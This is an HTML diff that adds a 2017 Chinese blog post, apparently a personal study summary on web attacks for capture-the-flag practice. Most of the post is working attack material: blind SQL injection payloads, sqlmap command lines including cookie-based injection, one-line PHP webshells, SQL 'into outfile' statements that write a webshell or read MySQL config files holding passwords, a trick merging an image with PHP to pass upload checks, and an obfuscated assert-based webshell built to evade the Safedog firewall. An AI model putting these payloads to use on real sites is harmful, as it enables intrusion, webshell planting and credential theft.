@@ -152,6 +152,102 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-11月总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/11/29/11月总结/">11月总结</a>
+    </h1>
+  
+
+        
+        <a href="/2017/11/29/11月总结/" class="archive-article-date">
+  	<time datetime="2017-11-29T05:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-29</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>·<strong>sql手注：1.报错注入<br>                2.盲注<br>       文件上传（包含）：一句话木马</strong><br>        变量覆盖漏洞<br>        逻辑处理漏洞<br>        二次漏洞</p>
+<p><em>盲注</em><br>-</p>
+<pre><code>(ascii(substr((select database()) ,1,1))) &lt; 116 --+
+
+locus IN(&apos;AB086827&apos;,&apos;AF040764&apos;)
+</code></pre><p>sqlmap</p>
+<pre><code>过注入点扫描确认信息           python sqlmap.py -u url --dbms mysql
+指定参数注入                  python sqlmap.py -u &quot;http://192.168.1.1/page.php?id=1&amp;cat=2&quot; -v 1 -p &quot;cat,id&quot;
+指定方法和post的数据 python sqlmap.py -u &quot;http://192.168.1.1/page.php&quot; --method &quot;POST&quot; -- data &quot;id=1&amp;cat=2&quot;
+指定cookie,可以注入一些需要登录的地址 python sqlmap.py -u &quot;http://192.168.1.1/page.php?id=1&amp;cat=2&quot; --cookie &quot;COOKIE_VALUE&quot;
+[部分sqlmap手册](http://localhost/sqlmap手册（部分）.txt)
+</code></pre><h2 id="文件上传（包含）：一句话木马"><a href="#文件上传（包含）：一句话木马" class="headerlink" title="文件上传（包含）：一句话木马"></a>文件上传（包含）：一句话木马</h2><pre><code>原型：eval($_GET[‘x’]);或者assert($_GET[‘x’]);
+
+上述我们提到了 load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语句：
+selectload_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)into outfile ‘c:\\wamp\\www\\test.php’
+可以利用该语句将服务器当中的内容导入到 web 服务器下的目录，这样就可以得到数据了。 上述 my.ini当中存在 password 项（不过默认被注释），当然会有很多的内容可以被导出来， 这个要平时积累。
+union+select+webshell的hex编码+into+outfile+‘网络物理路径\\a.php’
+导入外部文件报错：The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
+
+
+实验吧的题目 [上传绕过](http://ctf5.shiyanbar.com/web/upload/)
+图片php合并 copy q.jpg/b+xxx.php/xxx.jpg 通过文件头检查
+
+字符串截取绕过安全狗
+&lt;?php
+ $a = substr(&quot;abcdefghijklmnopqrstufwxyz&quot;,0,1);
+ $b = substr(&quot;abcdefghijklmnopqrstufwxyz&quot;,17,3);
+ $c = substr(&quot;abcdefghijklmnopqrstufwxyz&quot;,3,2);
+ $ss = $a.$b.$c;
+ $d  = $ss[0].$ss[2].$ss[2]; //ass
+ $dd = $ss[5].$ss[1].$ss[3]; //ert
+ $x = $d.$dd;//assert
+$x($_POST[&apos;x&apos;]);
+?&gt;
+</code></pre>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/11/29/11月总结/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
